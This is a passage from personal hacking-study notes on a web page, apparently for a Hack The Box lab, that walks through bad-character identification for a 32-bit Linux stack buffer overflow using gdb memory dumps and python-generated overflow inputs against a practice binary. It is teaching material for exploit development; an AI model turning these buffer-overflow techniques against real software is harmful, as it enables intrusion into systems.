</span></span><span class=line><span class=cl>0xffffd2ba: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
</span></span><span class=line><span class=cl>0xffffd2c2: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
</span></span><span class=line><span class=cl>&lt;SNIP&gt;
</span></span></code></pre></td></tr></table></div></div><p>Here we can see at which address &ldquo;<code>\x55</code>&rdquo; starts. From here we can go further down and look for the place where <code>CHARS</code> start:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&lt;SNIP&gt;
</span></span><span class=line><span class=cl>0xffffd5aa:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
</span></span><span class=line><span class=cl>0xffffd5b2:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
</span></span><span class=line><span class=cl>0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
</span></span><span class=line><span class=cl>												 <span class=c1># |---&gt; CHARS begin</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
</span></span><span class=line><span class=cl>0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
</span></span><span class=line><span class=cl>0xffffd5d2:	0x15	0x16	0x17	0x18	0x19	0x1a	0x1b	0x1c
</span></span><span class=line><span class=cl>&lt;SNIP&gt;
</span></span></code></pre></td></tr></table></div></div><p>We see where our &ldquo;<code>\x55</code>&rdquo; ends, and the <code>CHARS</code> variable begins. But if we look closely at it, we will see that it starts with &ldquo;<code>\x01</code>&rdquo; instead of &ldquo;<code>\x00</code>&rdquo;. We have already seen the warning during the execution that the <code>null byte</code> in our input was ignored.</p><p>So we can note this character, remove it from our variable <code>CHARS</code> and adjust the number of our &ldquo;<code>\x55</code>&rdquo;.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Substract the number of removed characters</span>
</span></span><span class=line><span class=cl><span class=nv>Buffer</span> <span class=o>=</span> <span class=s2>&#34;\x55&#34;</span> * <span class=o>(</span><span class=m>1040</span> - <span class=m>255</span> - 4<span class=o>)</span> <span class=o>=</span> <span class=m>781</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># &#34;\x00&#34; removed: 256 - 1 = 255 bytes</span>
</span></span><span class=line><span class=cl><span class=nv>CHARS</span> <span class=o>=</span> <span class=s2>&#34;\x01\x02\x03...&lt;SNIP&gt;...\xfd\xfe\xff&#34;</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=nv>EIP</span> <span class=o>=</span> <span class=s2>&#34;\x66&#34;</span> * <span class=m>4</span>
</span></span></code></pre></td></tr></table></div></div><p>Now we send without null bytes:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>gdb<span class=o>)</span> run <span class=k>$(</span>python -c <span class=s1>&#39;print &#34;\x55&#34; * (1040 - 255 - 4) + &#34;\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff&#34; + &#34;\x66&#34; * 4&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The program being debugged has been started already.
</span></span><span class=line><span class=cl>Start it from the beginning? <span class=o>(</span>y or n<span class=o>)</span> y
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting program: /home/student/bow/bow32 <span class=k>$(</span>python -c <span class=s1>&#39;print &#34;\x55&#34; * (1040 - 255 - 4) + &#34;\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff&#34; + &#34;\x66&#34; * 4&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>Breakpoint 1, 0x56555551 in bowfunc <span class=o>()</span>
</span></span></code></pre></td></tr></table></div></div><p>And the stack:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>(gdb) x/2000xb $esp+550
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
</span></span></span><span class=line><span class=cl><span class=go>0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
</span></span></span><span class=line><span class=cl><span class=go>												 # |----| &lt;- &#34;\x09&#34; expected
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></td></tr></table></div></div><p>Here it depends on our bytes&rsquo; correct order in the variable <code>CHARS</code> to see if any character changes, interrupts, or skips the order. Now we recognize that after the &ldquo;<code>\x08</code>&rdquo;, we encounter the &ldquo;<code>\x00</code>&rdquo; instead of the &ldquo;<code>\x09</code>&rdquo; as expected. This tells us that this character is not allowed here and must be removed accordingly:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Substract the number of removed characters</span>
</span></span><span class=line><span class=cl><span class=nv>Buffer</span> <span class=o>=</span> <span class=s2>&#34;\x55&#34;</span> * <span class=o>(</span><span class=m>1040</span> - <span class=m>254</span> - 4<span class=o>)</span> <span class=o>=</span> 782	
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># &#34;\x00&#34; &amp; &#34;\x09&#34; removed: 256 - 2 = 254 bytes</span>
</span></span><span class=line><span class=cl> <span class=nv>CHARS</span> <span class=o>=</span> <span class=s2>&#34;\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...&lt;SNIP&gt;...\xfd\xfe\xff&#34;</span> 
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>   <span class=nv>EIP</span> <span class=o>=</span> <span class=s2>&#34;\x66&#34;</span> * <span class=m>4</span>
</span></span></code></pre></td></tr></table></div></div><p>We send:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>gdb<span class=o>)</span> run <span class=k>$(</span>python -c <span class=s1>&#39;print &#34;\x55&#34; * (1040 - 254 - 4) + &#34;\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...&lt;SNIP&gt;...\xfc\xfd\xfe\xff&#34; + &#34;\x66&#34; * 4&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The program being debugged has been started already.
</span></span><span class=line><span class=cl>Start it from the beginning? <span class=o>(</span>y or n<span class=o>)</span> y
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting program: /home/student/bow/bow32 <span class=k>$(</span>python -c <span class=s1>&#39;print &#34;\x55&#34; * (1040 - 254 - 4) + &#34;\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...&lt;SNIP&gt;...\xfc\xfd\xfe\xff&#34; + &#34;\x66&#34; * 4&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>Breakpoint 1, 0x56555551 in bowfunc <span class=o>()</span>
</span></span></code></pre></td></tr></table></div></div><p>The stack:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>gdb<span class=o>)</span> x/2000xb <span class=nv>$esp</span>+550
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;SNIP&gt;
</span></span><span class=line><span class=cl>0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
</span></span><span class=line><span class=cl>0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
</span></span><span class=line><span class=cl>												 <span class=c1># |----| &lt;- &#34;\x0a&#34; expected</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
</span></span><span class=line><span class=cl>&lt;SNIP&gt;
</span></span></code></pre></td></tr></table></div></div><p>To find stack size, for example the size after overwritting:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>gdb<span class=o>)</span> info proc all
</span></span></code></pre></td></tr></table></div></div></article><hr><div class=page-end id=footer><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li><a href=/quartz/notes/hacking/htb-stack-based-overflow-linux/ data-ctx="Take Control of EIP" data-src=/notes/hacking/htb-stack-based-overflow-linux class=internal-link>Stack-based Overflow - Linux x86</a></li></ul></div><div><script src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282}</style><script src=https://pietraferreira.github.io/quartz/js/graph.abd4bc2af3869a96524d7d23b76152c7.js></script></div></div><div id=contact_buttons><footer><p>Made by Morioh using <a href=https://github.com/jackyzha0/quartz>Quartz</a>, Â© 2023</p><ul><li><a href=https://pietraferreira.github.io/quartz/>Home</a></li><li><a href=https://github.com/pietraferreira>Github</a></li></ul></footer></div></div></body></html>